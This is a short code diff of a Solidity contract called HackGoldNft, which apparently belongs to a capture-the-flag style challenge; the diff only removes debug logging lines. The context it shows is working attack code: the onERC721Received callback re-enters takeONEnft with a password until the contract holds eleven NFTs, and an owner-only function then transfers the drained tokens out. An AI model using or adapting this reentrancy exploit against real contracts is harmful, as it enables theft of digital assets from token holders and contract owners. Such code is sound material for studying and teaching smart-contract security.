@@ -42,7 +42,6 @@ contract HackGoldNft {
     }
 
     function initializeReent()external isOwner{
-        console.log("init checkpoint");
         nft.takeONEnft(PASS);
     }
     function onERC721Received(
@@ -51,8 +50,6 @@ contract HackGoldNft {
         uint256 tokenId,
         bytes calldata data
     ) external returns (bytes4){
-        console.log("onERCRECEIVED checkpoint");
-        console.log(tokenId);
         uint256 balance = nft.balanceOf(address(this));
         if (balance < 11){
             nft.takeONEnft(PASS);
@@ -63,7 +60,6 @@ contract HackGoldNft {
 
 
     function withdrawNFTs() external isOwner{
-        console.log('withdrawNFTs checkmark');
         for(uint i=1;i<11;i++){
             console.log(i);
             nft.transferFrom(address(this), msg.sender, i);      
